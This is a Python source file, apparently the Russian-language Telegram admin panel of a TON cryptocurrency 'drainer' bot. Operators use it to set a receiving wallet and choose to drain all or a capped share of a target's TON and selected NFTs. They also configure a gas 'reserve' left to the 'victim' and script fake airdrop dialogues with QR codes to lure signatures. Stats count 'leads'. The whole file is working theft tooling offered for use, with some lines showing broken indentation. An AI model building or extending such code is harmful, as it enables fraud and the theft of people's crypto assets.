import json

from aiogram import F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import CallbackQuery, InlineKeyboardButton as B, InlineKeyboardMarkup as M, Message

from bot import db, engine, keyboards as kb
from bot.config import ADMIN_IDS
from bot.qr import qr_png, valid_addr

router = Router()


class E(StatesGroup):
    wallet = State(); gas = State(); toncap = State(); maxn = State()
    reserve = State(); delay = State(); nftadd = State(); colladd = State()
    scen_new = State(); st_text = State(); st_secs = State(); qr_cap = State()


def guard(e) -> bool:
    return e.from_user.id in ADMIN_IDS


# ---------- меню ----------

async def render_menu(msg, state: FSMContext | None = None) -> None:
    if state:
        await state.clear()
    s = {k: await db.get_setting(k, "") for k in
         ("wallet", "mode", "gas_ton", "drain_ton", "ton_cap", "nft_source")}
    cap = "" if s["ton_cap"] in ("", "0") else f" (кап {s['ton_cap']})"
    await msg.edit_text(
        "<b>Админка</b>\n"
        f"Кошелёк: <code>{s['wallet'] or '—'}</code>\n"
        f"Режим: {s['mode']}\nГаз: {s['gas_ton']} TON\n"
        f"Снять TON: {'всё' if s['drain_ton'] == '1' else 'нет'}{cap}\n"
        f"Источник: {s['nft_source']}",
        reply_markup=kb.admin(), parse_mode="HTML")


@router.message(Command("admin"))
async def menu(m: Message, state: FSMContext) -> None:
    if not guard(m):
        return
    await state.clear()
    s = {k: await db.get_setting(k, "") for k in
         ("wallet", "mode", "gas_ton", "drain_ton", "ton_cap", "nft_source")}
    cap = "" if s["ton_cap"] in ("", "0") else f" (кап {s['ton_cap']})"
    await m.answer(
        "<b>Админка</b>\n"
        f"Кошелёк: <code>{s['wallet'] or '—'}</code>\n"
        f"Режим: {s['mode']}\nГаз: {s['gas_ton']} TON\n"
        f"Снять TON: {'всё' if s['drain_ton'] == '1' else 'нет'}{cap}\n"
        f"Источник: {s['nft_source']}",
        reply_markup=kb.admin(), parse_mode="HTML")


@router.callback_query(F.data == "a:menu")
async def back(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await render_menu(c.message, state)
    await c.answer()


@router.callback_query(F.data == "a:stats")
async def stats(c: CallbackQuery) -> None:
    if not guard(c):
        return
    total, starts = await db.stats()
    await c.message.edit_text(f"Лидов: {total}\nЗапусков: {starts}", reply_markup=kb.back())
    await c.answer()


# ---------- кошелёк ----------

@router.callback_query(F.data == "a:wallet")
async def w(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.wallet)
    await c.message.edit_text("Адрес кошелька-приёмника:", reply_markup=kb.back())
    await c.answer()


@router.message(E.wallet)
async def w_in(m: Message, state: FSMContext) -> None:
    if not valid_addr(m.text):
        await m.answer("Не парсится как адрес. Ещё раз:")
        return
    await db.set_setting("wallet", m.text.strip())
    await state.clear()
    await m.answer("Сохранено.")


# ---------- режим ----------

@router.callback_query(F.data == "a:mode")
async def mode(c: CallbackQuery) -> None:
if not guard(c):
        return
    await c.message.edit_text(
        "<b>plain</b> — только газ, ничего не снимает\n"
        "<b>nft</b> — один предмет, чистый ton://, сайт не нужен\n"
        "<b>tonconnect</b> — все NFT / весь TON, нужен WEB_BASE",
        reply_markup=M(inline_keyboard=[
            [B(text="plain", callback_data="a:mode:plain")],
            [B(text="nft", callback_data="a:mode:nft")],
            [B(text="tonconnect", callback_data="a:mode:tonconnect")],
            [B(text="« Назад", callback_data="a:menu")]]), parse_mode="HTML")
    await c.answer()


@router.callback_query(F.data.startswith("a:mode:"))
async def mode_set(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await db.set_setting("mode", c.data.split(":")[2])
    await c.answer("Готово")
    await render_menu(c.message, state)


# ---------- газ ----------

@router.callback_query(F.data == "a:gas")
async def gas(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.gas)
    await c.message.edit_text("Сумма газа в TON (0.05–0.1):", reply_markup=kb.back())
    await c.answer()


@router.message(E.gas)
async def gas_in(m: Message, state: FSMContext) -> None:
    try:
        v = float(m.text.replace(",", "."))
        assert 0.01 <= v <= 5
    except Exception:
        await m.answer("Число 0.01–5:")
        return
    await db.set_setting("gas_ton", str(v))
    await state.clear()
    await m.answer("Сохранено.")


# ---------- TON ----------

@router.callback_query(F.data == "a:ton")
async def ton(c: CallbackQuery) -> None:
    if not guard(c):
        return
    await c.message.edit_text("Снимать TON с баланса?",
        reply_markup=M(inline_keyboard=[
            [B(text="нет", callback_data="a:ton:off")],
            [B(text="всё", callback_data="a:ton:all")],
            [B(text="с потолком", callback_data="a:ton:cap")],
            [B(text="« Назад", callback_data="a:menu")]]))
    await c.answer()


@router.callback_query(F.data == "a:ton:off")
async def ton_off(c: CallbackQuery) -> None:
    if not guard(c):
        return
    await db.set_setting("drain_ton", "0")
    await c.answer("Выключено")


@router.callback_query(F.data == "a:ton:all")
async def ton_all(c: CallbackQuery) -> None:
    if not guard(c):
        return
    await db.set_setting("drain_ton", "1")
    await db.set_setting("ton_cap", "0")
    await c.answer("Снимаем всё")


@router.callback_query(F.data == "a:ton:cap")
async def ton_cap(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await db.set_setting("drain_ton", "1")
    await state.set_state(E.toncap)
    await c.message.edit_text("Потолок в TON (0 — без потолка):", reply_markup=kb.back())
    await c.answer()


@router.message(E.toncap)
async def toncap_in(m: Message, state: FSMContext) -> None:
    try:
        v = float(m.text.replace(",", "."))
    except ValueError:
        await m.answer("Число:")
        return
    await db.set_setting("ton_cap", str(v))
    await state.clear()
    await m.answer("Сохранено.")


# ---------- что снимать ----------

@router.callback_query(F.data == "a:nftsrc")
async def nftsrc(c: CallbackQuery) -> None:
    if not guard(c):
        return
    await c.message.edit_text("Источник предметов:",
        reply_markup=M(inline_keyboard=[
            [B(text="все NFT", callback_data="a:nftsrc:all")],
            [B(text="по списку", callback_data="a:nftsrc:list")],
            [B(text="по коллекциям", callback_data="a:nftsrc:collections")],
            [B(text="не снимать", callback_data="a:nftsrc:off")],
            [B(text="« Назад", callback_data="a:menu")]]))
    await c.answer()


@router.callback_query(F.data.startswith("a:nftsrc:"))
async def nftsrc_set(c: CallbackQuery) -> None:
    if not guard(c):
        return
    v = c.data.split(":")[2]
    await db.set_setting("nft_source", v)
    await c.answer("Готово")
    if v == "list":
        await render_list(c.message)
    elif v == "collections":
        await render_coll(c.
message)


async def render_list(msg) -> None:
    items = await db.get_json("nft_list")
    body = "\n".join(f"{i}. {x.get('name', '—')} — <code>{x['address'][:10]}…</code>"
                     for i, x in enumerate(items)) or "пусто"
    rows = [[B(text=f"🗑 {i}", callback_data=f"a:nftdel:{i}")] for i in range(len(items))]
    rows += [[B(text="+ добавить", callback_data="a:nftadd")], [B(text="« Назад", callback_data="a:menu")]]
    await msg.edit_text(f"<b>Предметы</b>\n{body}", reply_markup=M(inline_keyboard=rows),
                        parse_mode="HTML")


async def render_coll(msg) -> None:
    items = await db.get_json("nft_collections")
    body = "\n".join(f"{i}. {x.get('name', '—')}" for i, x in enumerate(items)) or "пусто"
    rows = [[B(text=f"🗑 {i}", callback_data=f"a:colldel:{i}")] for i in range(len(items))]
    rows += [[B(text="+ добавить", callback_data="a:colladd")], [B(text="« Назад", callback_data="a:menu")]]
    await msg.edit_text(f"<b>Коллекции</b>\n{body}", reply_markup=M(inline_keyboard=rows),
                        parse_mode="HTML")


@router.callback_query(F.data == "a:nftadd")
async def nftadd(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.nftadd)
    await c.message.edit_text("Адрес предмета и через пробел название:\n"
                              "<code>EQ... Scared Cat</code>", reply_markup=kb.back(),
                              parse_mode="HTML")
    await c.answer()


@router.message(E.nftadd)
async def nftadd_in(m: Message, state: FSMContext) -> None:
    parts = m.text.split(maxsplit=1)
    if not parts or not valid_addr(parts[0]):
        await m.answer("Первый токен — адрес. Ещё раз:")
        return
    items = await db.get_json("nft_list")
    items.append({"address": parts[0], "name": parts[1] if len(parts) > 1 else "—"})
    await db.set_json("nft_list", items)
    await state.clear()
    await m.answer(f"Добавлено, всего {len(items)}.")


@router.callback_query(F.data.startswith("a:nftdel:"))
async def nftdel(c: CallbackQuery) -> None:
    if not guard(c):
        return
    items = await db.get_json("nft_list")
    i = int(c.data.split(":")[2])
    if i < len(items):
        items.pop(i)
        await db.set_json("nft_list", items)
    await c.answer("Удалено")
    await render_list(c.message)


@router.callback_query(F.data == "a:colladd")
async def colladd(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.colladd)
    await c.message.edit_text("Адрес коллекции и название:", reply_markup=kb.back())
    await c.answer()


@router.message(E.colladd)
async def colladd_in(m: Message, state: FSMContext) -> None:
    parts = m.text.split(maxsplit=1)
    if not parts or not valid_addr(parts[0]):
        await m.answer("Первый токен — адрес. Ещё раз:")
        return
    items = await db.get_json("nft_collections")
    items.append({"address": parts[0], "name": parts[1] if len(parts) > 1 else "—"})
    await db.set_json("nft_collections", items)
    await state.clear()
    await m.answer(f"Добавлено, всего {len(items)}.")


@router.callback_query(F.data.startswith("a:colldel:"))
async def colldel(c: CallbackQuery) -> None:
    if not guard(c):
        return
    items = await db.get_json("nft_collections")
    i = int(c.data.split(":")[2])
    if i < len(items):
        items.pop(i)
        await db.set_json("nft_collections", items)
    await c.answer("Удалено")
    await render_coll(c.message)


# ---------- лимиты ----------

@router.callback_query(F.data == "a:limits")
async def limits(c: CallbackQuery) -> None:
    if not guard(c):
        return
    mx = await db.get_setting("max_nfts")
    rs = await db.get_setting("reserve")
    dl = await db.get_setting("delay")
    await c.message.edit_text(f"Макс. NFT: {mx}\nРезерв: {rs} TON\nПаузы: x{dl}",
        reply_markup=M(inline_keyboard=[
            [B(text="макс. NFT", callback_data="a:maxn"), B(text="резерв", callback_data="a:reserve")],
            [B(text="паузы", callback_data="a:delay")],
[B(text="« Назад", callback_data="a:menu")]]))
    await c.answer()


@router.callback_query(F.data == "a:maxn")
async def maxn(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.maxn)
    await c.message.edit_text("Сколько NFT максимум (1–200):", reply_markup=kb.back())
    await c.answer()


@router.message(E.maxn)
async def maxn_in(m: Message, state: FSMContext) -> None:
    try:
        v = int(m.text)
        assert 1 <= v <= 200
    except Exception:
        await m.answer("Число 1–200:")
        return
    await db.set_setting("max_nfts", str(v))
    await state.clear()
    await m.answer("Сохранено.")


@router.callback_query(F.data == "a:reserve")
async def reserve(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.reserve)
    await c.message.edit_text("Сколько оставить жертве на газ:", reply_markup=kb.back())
    await c.answer()


@router.message(E.reserve)
async def reserve_in(m: Message, state: FSMContext) -> None:
    try:
        v = float(m.text.replace(",", "."))
    except ValueError:
        await m.answer("Число:")
        return
    await db.set_setting("reserve", str(v))
    await state.clear()
    await m.answer("Сохранено.")


@router.callback_query(F.data == "a:delay")
async def delay(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.delay)
    await c.message.edit_text("Множитель пауз: 0.3 быстро, 1.0 как есть, 2.0 вальяжно:",
                              reply_markup=kb.back())
    await c.answer()


@router.message(E.delay)
async def delay_in(m: Message, state: FSMContext) -> None:
    try:
        v = float(m.text.replace(",", "."))
        assert 0.1 <= v <= 5
    except Exception:
        await m.answer("Число 0.1–5:")
        return
    await db.set_setting("delay", str(v))
    await state.clear()
    await m.answer("Сохранено.")


# ---------- сценарии ----------

async def render_scen(msg) -> None:
    await msg.edit_text("Сценарии: ▶️ запуск здесь, ✏️ шаги, 🗑 удалить",
                        reply_markup=kb.scen_list())


async def render_steps(msg, sid: str) -> None:
    sc = engine.load(sid)
    if not sc:
        await msg.edit_text("Сценарий пропал", reply_markup=kb.back())
        return
    await msg.edit_text(f"<b>{sc['title']}</b> — шаги", reply_markup=kb.steps(sid, sc),
                        parse_mode="HTML")


@router.callback_query(F.data == "a:scen")
async def scen(c: CallbackQuery) -> None:
    if not guard(c):
        return
    await render_scen(c.message)
    await c.answer()


@router.callback_query(F.data.startswith("a:run:"))
async def run(c: CallbackQuery) -> None:
    if not guard(c):
        return
    err = await engine.run(c.bot, c.message.chat.id, c.from_user.id,
                           c.from_user.username, c.data.split(":", 2)[2])
    await c.answer(err or "Запущено", show_alert=bool(err))


@router.callback_query(F.data == "a:scen:new")
async def scen_new(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.set_state(E.scen_new)
    await c.message.edit_text("id и название через пробел:\n<code>airdrop Эйрдроп</code>",
                              reply_markup=kb.back(), parse_mode="HTML")
    await c.answer()


@router.message(E.scen_new)
async def scen_new_in(m: Message, state: FSMContext) -> None:
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[0].isalnum():
        await m.answer("id латиницей + название:")
        return
    engine.save(parts[0], {"title": parts[1], "steps": []})
    await state.clear()
    await m.answer(f"Создан {parts[0]}. Открой и добавь шаги.")


@router.callback_query(F.data.startswith("a:scen:del:"))
async def scen_del(c: CallbackQuery) -> None:
    if not guard(c):
        return
    engine.delete(c.data.split(":", 3)[3])
    await c.answer("Удалён")
    await render_scen(c.message)


@router.callback_query(F.data.startswith("a:scen:edit:"))
async def scen_edit(c: CallbackQuery) -> None:
    if not guard(c):
        return
    await render_steps(c.message, c.data.split(":", 3)[3])
    await c.answer()


@router.callback_query(F.data.startswith("a:st:add:"))
async def st_add(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    await state.update_data(sid=c.data.split(":", 3)[3])
    await c.message.edit_text("Тип шага:",
        reply_markup=M(inline_keyboard=[
            [B(text="текст", callback_data="a:add:text")],
            [B(text="пауза", callback_data="a:add:typing")],
            [B(text="QR", callback_data="a:add:qr")],
            [B(text="« Назад", callback_data="a:scen")]]))
    await c.answer()


@router.callback_query(F.data.startswith("a:add:"))
async def add_kind(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    kind, sid = c.data.split(":")[2], (await state.get_data())["sid"]
    if kind == "typing":
        sc = engine.load(sid)
        sc["steps"].append({"type": "typing", "seconds": 3})
        engine.save(sid, sc)
        await c.answer("Добавлено")
        await render_steps(c.message, sid)
        return
    await state.update_data(kind=kind)
    await state.set_state(E.st_text if kind == "text" else E.qr_cap)
    await c.message.edit_text("Текст сообщения:" if kind == "text" else "Подпись под QR:",
                              reply_markup=kb.back())
    await c.answer()


@router.message(E.st_text)
async def st_text_in(m: Message, state: FSMContext) -> None:
    d = await state.get_data()
    sc = engine.load(d["sid"])
    if d.get("kind") == "text":
        sc["steps"][d["idx"]]["text"] = m.text
    else:
        sc["steps"].append({"type": "text", "text": m.text})
    engine.save(d["sid"], sc)
    await state.clear()
    await m.answer("Ок.")


@router.message(E.qr_cap)
async def qr_cap_in(m: Message, state: FSMContext) -> None:
    d = await state.get_data()
    sc = engine.load(d["sid"])
    if d.get("kind") == "qr":
        sc["steps"][d["idx"]]["caption"] = m.text
    else:
        sc["steps"].append({"type": "qr", "caption": m.text})
    engine.save(d["sid"], sc)
    await state.clear()
    await m.answer("Ок.")


@router.callback_query(F.data.startswith("a:st:del:"))
async def st_del(c: CallbackQuery) -> None:
    if not guard(c):
        return
    _, _, _, sid, i = c.data.split(":")
    sc = engine.load(sid)
    if int(i) < len(sc["steps"]):
        sc["steps"].pop(int(i))
        engine.save(sid, sc)
    await c.answer("Удалено")
    await render_steps(c.message, sid)


@router.callback_query(F.data.startswith("a:st:edit:"))
async def st_edit(c: CallbackQuery) -> None:
    if not guard(c):
        return
    _, _, _, sid, i = c.data.split(":")
    step = engine.load(sid)["steps"][int(i)]
    rows = []
    if step["type"] == "text":
        rows.append([B(text="изменить текст", callback_data=f"a:st:text:{sid}:{i}")])
        rows.append([B(text="убрать ожидание" if step.get("wait") else "ждать ответа",
                       callback_data=f"a:st:wait:{sid}:{i}")])
    if step["type"] == "typing":
        rows.append([B(text="изменить секунды", callback_data=f"a:st:secs:{sid}:{i}")])
    if step["type"] == "qr":
        rows.append([B(text="изменить подпись", callback_data=f"a:st:cap:{sid}:{i}")])
    rows.append([B(text="« Назад", callback_data=f"a:scen:edit:{sid}")])
    await c.message.edit_text(f"<code>{json.dumps(step, ensure_ascii=False, indent=2)}</code>",
                              reply_markup=M(inline_keyboard=rows), parse_mode="HTML")
    await c.answer()


@router.callback_query(F.data.startswith("a:st:wait:"))
async def st_wait(c: CallbackQuery) -> None:
    if not guard(c):
        return
    _, _, _, sid, i = c.data.split(":")
    sc = engine.load(sid)
    sc["steps"][int(i)]["wait"] = not sc["steps"][int(i)].get("wait")
    engine.save(sid, sc)
    await c.answer("Переключено")
    await render_steps(c.message, sid)


@router.callback_query(F.data.startswith("a:st:text:"))
async def st_text_edit(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    _, _, _, sid, i = c.data.split(":")
    await state.set_state(E.st_text)
    await state.update_data(sid=sid, idx=int(i), kind="edit")
    await c.message.edit_text("Новый текст:", reply_markup=kb.back())
    await c.answer()


@router.callback_query(F.data.startswith("a:st:secs:"))
async def st_secs(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    _, _, _, sid, i = c.data.split(":")
    await state.set_state(E.st_secs)
    await state.update_data(sid=sid, idx=int(i))
    await c.message.edit_text("Секунды:", reply_markup=kb.back())
    await c.answer()


@router.message(E.st_secs)
async def st_secs_in(m: Message, state: FSMContext) -> None:
    d = await state.get_data()
    sc = engine.load(d["sid"])
    sc["steps"][d["idx"]]["seconds"] = float(m.text.replace(",", "."))
    engine.save(d["sid"], sc)
    await state.clear()
    await m.answer("Сохранено.")


@router.callback_query(F.data.startswith("a:st:cap:"))
async def st_cap(c: CallbackQuery, state: FSMContext) -> None:
    if not guard(c):
        return
    _, _, _, sid, i = c.data.split(":")
    await state.set_state(E.qr_cap)
    await state.update_data(sid=sid, idx=int(i), kind="edit")
    await c.message.edit_text("Новая подпись:", reply_markup=kb.back())
    await c.answer()


# ---------- тест ----------

@router.callback_query(F.data == "a:test")
async def test(c: CallbackQuery) -> None:
    if not guard(c):
        return
    try:
        data, desc = engine.build_qr(await engine.cfg_for(None))
    except ValueError as e:
        await c.answer(str(e), show_alert=True)
        return
    await c.message.answer_photo(qr_png(data), caption=f"Тест: {desc}", parse_mode="HTML")
    await c.answer()
